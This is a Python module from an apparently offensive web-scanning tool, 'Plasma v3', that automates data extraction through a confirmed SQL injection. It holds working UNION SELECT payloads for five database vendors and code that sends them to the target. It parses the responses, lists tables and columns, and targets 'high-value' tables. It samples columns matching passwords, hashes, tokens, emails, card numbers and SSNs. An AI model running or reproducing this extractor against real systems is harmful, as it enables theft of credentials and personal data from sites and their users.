"""
modules/db_extractor.py — Plasma v3
──────────────────────────────────────
DBExtractor: automatic database schema extraction on confirmed SQLi.

Given a confirmed injection endpoint + parameter, attempts to extract:
  - DB version & vendor
  - Current database name
  - Table listing
  - Column listing (for high-value tables)
  - Sample row count per table

Activated via --extract-db CLI flag (only fires after SQLi confirmation).

Supported databases
───────────────────
  MySQL / MariaDB — information_schema
  PostgreSQL      — information_schema / pg_catalog
  MSSQL           — information_schema / sys tables
  SQLite          — sqlite_master
  Oracle          — ALL_TABLES / ALL_COLUMNS

Architecture
────────────
  DBExtractor(session, endpoint, param, profile)
    .identify_db()   → DBInfo(vendor, version, db_name)
    .list_tables()   → list[str]
    .list_columns(table) → list[ColumnInfo]
    .extract_sample(table, column, limit) → list[str]
    .full_dump()     → DBSchema — convenience wrapper for all above

Usage
─────
    from modules.db_extractor import DBExtractor
    extractor = DBExtractor(session, endpoint, param="id")
    schema    = extractor.full_dump()
    print(schema.summary())
"""

from __future__ import annotations

import logging
import re
import time
from dataclasses import dataclass, field
from typing import Optional

import requests

log = logging.getLogger(__name__)

# ── Extraction queries — per DB vendor ───────────────────────────────────────

_QUERIES: dict[str, dict[str, str]] = {
    "mysql": {
        "version":   "' UNION SELECT @@version,NULL--",
        "db_name":   "' UNION SELECT database(),NULL--",
        "tables":    "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
        "columns":   "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
        "sample":    "' UNION SELECT {col},NULL FROM {table} LIMIT {limit}--",
    },
    "pgsql": {
        "version":   "' UNION SELECT version(),NULL--",
        "db_name":   "' UNION SELECT current_database(),NULL--",
        "tables":    "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--",
        "columns":   "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
        "sample":    "' UNION SELECT {col}::text,NULL FROM {table} LIMIT {limit}--",
    },
    "mssql": {
        "version":   "' UNION SELECT @@version,NULL--",
        "db_name":   "' UNION SELECT db_name(),NULL--",
        "tables":    "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_type='BASE TABLE'--",
        "columns":   "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{table}'--",
        "sample":    "' UNION SELECT TOP {limit} {col},NULL FROM {table}--",
    },
    "sqlite": {
        "version":   "' UNION SELECT sqlite_version(),NULL--",
        "db_name":   "' UNION SELECT 'sqlite',NULL--",
        "tables":    "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
        "columns":   "' UNION SELECT name,NULL FROM pragma_table_info('{table}')--",
        "sample":    "' UNION SELECT {col},NULL FROM {table} LIMIT {limit}--",
    },
    "oracle": {
        "version":   "' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--",
        "db_name":   "' UNION SELECT global_name,NULL FROM global_name--",
        "tables":    "' UNION SELECT table_name,NULL FROM all_tables--",
        "columns":   "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name=UPPER('{table}')--",
        "sample":    "' UNION SELECT {col},NULL FROM {table} WHERE ROWNUM<={limit}--",
    },
}

_VERSION_PATTERNS: list[tuple[str, re.Pattern]] = [
    ("mysql",  re.compile(r"(\d+\.\d+\.\d+-MariaDB|\d+\.\d+\.\d+)", re.I)),
    ("pgsql",  re.compile(r"PostgreSQL\s+(\d+\.\d+)", re.I)),
    ("mssql",  re.compile(r"Microsoft SQL Server.*?(\d{4})", re.I)),
    ("sqlite", re.compile(r"(\d+\.\d+\.\d+)\s+\d{4}-\d{2}-\d{2}", re.I)),
    ("oracle", re.compile(r"Oracle Database\s+(\S+)", re.I)),
]

# Tables worth auto-extracting columns for
_HIGH_VALUE_TABLES = re.compile(
    r"(user|admin|account|credential|password|secret|token|session|"
    r"customer|employee|staff|member|auth|login|role|perm)",
    re.I,
)


@dataclass
class ColumnInfo:
    name:       str
    table:      str
    sample:     list[str] = field(default_factory=list)


@dataclass
class DBInfo:
    vendor:   str
    version:  str
    db_name:  str


@dataclass
class DBSchema:
    info:    Optional[DBInfo]
    tables:  list[str]                      = field(default_factory=list)
    columns: dict[str, list[ColumnInfo]]    = field(default_factory=dict)

    def summary(self) -> str:
        lines = ["── DB Schema Extraction ────────────────────────"]
        if self.info:
            lines.append(f"  Vendor  : {self.info.vendor}")
            lines.append(f"  Version : {self.info.version}")
            lines.append(f"  DB Name : {self.info.db_name}")
        lines.append(f"  Tables  : {len(self.tables)}")
        for tbl in self.tables[:10]:
            cols = self.columns.get(tbl, [])
            lines.append(f"    {tbl} ({len(cols)} columns)")
            for col in cols[:5]:
                sample_str = (", ".join(col.sample[:3])) if col.sample else ""
                lines.append(f"      └─ {col.name}" + (f" → {sample_str}" if sample_str else ""))
        if len(self.tables) > 10:
            lines.append(f"    ... +{len(self.tables) - 10} more tables")
        lines.append("─" * 48)
        return "\n".join(lines)


class DBExtractor:
    """
    Extracts DB schema via UNION-based SQLi on a confirmed injection point.

    Args:
        session    : requests.Session (may carry auth cookies)
        endpoint   : Endpoint to inject into
        param      : parameter name confirmed as injectable
        vendor     : "auto" to detect, or explicit mysql/pgsql/mssql/sqlite/oracle
        timeout    : per-request timeout (seconds)
        max_tables : cap on table enumeration (avoids huge schemas)
        max_cols   : cap on columns per table
        max_sample : rows to sample per column
    """

    def __init__(
        self,
        session:    requests.Session,
        endpoint,                           # Endpoint (avoid circular import)
        param:      str,
        vendor:     str    = "auto",
        timeout:    int    = 10,
        max_tables: int    = 50,
        max_cols:   int    = 20,
        max_sample: int    = 3,
    ) -> None:
        self._session    = session
        self._endpoint   = endpoint
        self._param      = param
        self._vendor     = vendor
        self._timeout    = timeout
        self._max_tables = max_tables
        self._max_cols   = max_cols
        self._max_sample = max_sample

    # ── Public API ─────────────────────────────────────────────────────────────

    def identify_db(self) -> Optional[DBInfo]:
        """Probe for DB version and identify the vendor."""
        if self._vendor != "auto":
            raw = self._query(self._vendor, "version")
            return DBInfo(
                vendor=self._vendor,
                version=self._first_value(raw),
                db_name=self._first_value(self._query(self._vendor, "db_name")),
            ) if raw else None

        for vendor, pattern in _VERSION_PATTERNS:
            raw = self._query(vendor, "version")
            if raw is None:
                continue
            m = pattern.search(raw)
            if m:
                db_name = self._first_value(self._query(vendor, "db_name")) or "unknown"
                self._vendor = vendor          # lock in detected vendor
                return DBInfo(vendor=vendor, version=m.group(0), db_name=db_name)
        return None

    def list_tables(self) -> list[str]:
        """Return list of table names in the current database."""
        if self._vendor == "auto":
            self.identify_db()
        if self._vendor == "auto":
            return []

        raw = self._query(self._vendor, "tables")
        if not raw:
            return []
        return self._extract_list(raw)[: self._max_tables]

    def list_columns(self, table: str) -> list[ColumnInfo]:
        """Return column names for a given table."""
        if self._vendor == "auto":
            self.identify_db()

        q = _QUERIES.get(self._vendor, {}).get("columns", "")
        if not q:
            return []
        raw = self._raw_request(q.replace("{table}", table))
        if not raw:
            return []
        names = self._extract_list(raw)[: self._max_cols]
        return [ColumnInfo(name=n, table=table) for n in names]

    def extract_sample(self, table: str, column: str) -> list[str]:
        """Return up to max_sample row values from table.column."""
        q = _QUERIES.get(self._vendor, {}).get("sample", "")
        if not q:
            return []
        raw = self._raw_request(
            q.replace("{table}", table)
             .replace("{col}", column)
             .replace("{limit}", str(self._max_sample))
        )
        return self._extract_list(raw)[: self._max_sample] if raw else []

    def full_dump(self) -> DBSchema:
        """
        Orchestrate full schema extraction:
          1. Identify DB
          2. List tables
          3. For high-value tables: list columns + sample
        """
        db_info = self.identify_db()
        tables  = self.list_tables()
        columns: dict[str, list[ColumnInfo]] = {}

        for table in tables:
            if not _HIGH_VALUE_TABLES.search(table):
                continue   # skip low-value tables
            cols = self.list_columns(table)
            for col in cols:
                if self._looks_sensitive(col.name):
                    col.sample = self.extract_sample(table, col.name)
            columns[table] = cols
            time.sleep(0.1)   # polite delay between table queries

        return DBSchema(info=db_info, tables=tables, columns=columns)

    # ── Internal ───────────────────────────────────────────────────────────────

    def _query(self, vendor: str, query_type: str) -> Optional[str]:
        q = _QUERIES.get(vendor, {}).get(query_type)
        if not q:
            return None
        return self._raw_request(q)

    def _raw_request(self, payload: str) -> Optional[str]:
        method  = (self._endpoint.method or "GET").upper()
        params  = dict(self._endpoint.parameters)
        params[self._param] = payload
        try:
            if method == "POST":
                r = self._session.post(
                    self._endpoint.url, data=params,
                    timeout=self._timeout, allow_redirects=True)
            else:
                r = self._session.get(
                    self._endpoint.url, params=params,
                    timeout=self._timeout, allow_redirects=True)
            return r.text
        except Exception as exc:
            log.debug("[db_extractor] request error: %s", exc)
            return None

    @staticmethod
    def _first_value(text: Optional[str]) -> str:
        if not text:
            return "unknown"
        # Look for values between common separators injected by UNION payloads
        m = re.search(r"<td[^>]*>([^<]{3,})</td>", text)
        if m:
            return m.group(1).strip()
        # Plain line extraction
        for line in text.splitlines():
            line = line.strip()
            if len(line) > 2 and not line.startswith("<"):
                return line
        return "unknown"

    @staticmethod
    def _extract_list(text: str) -> list[str]:
        """Extract a list of values from UNION SELECT response body."""
        # Try table cells first
        values = re.findall(r"<td[^>]*>([^<]{1,200})</td>", text)
        if values:
            return [v.strip() for v in values if v.strip()]
        # Newline-separated fallback
        return [l.strip() for l in text.splitlines() if l.strip() and not l.strip().startswith("<")]

    @staticmethod
    def _looks_sensitive(col_name: str) -> bool:
        return bool(re.search(
            r"(pass|hash|secret|token|key|salt|email|credit|card|ssn|dob|phone)",
            col_name, re.I,
        ))
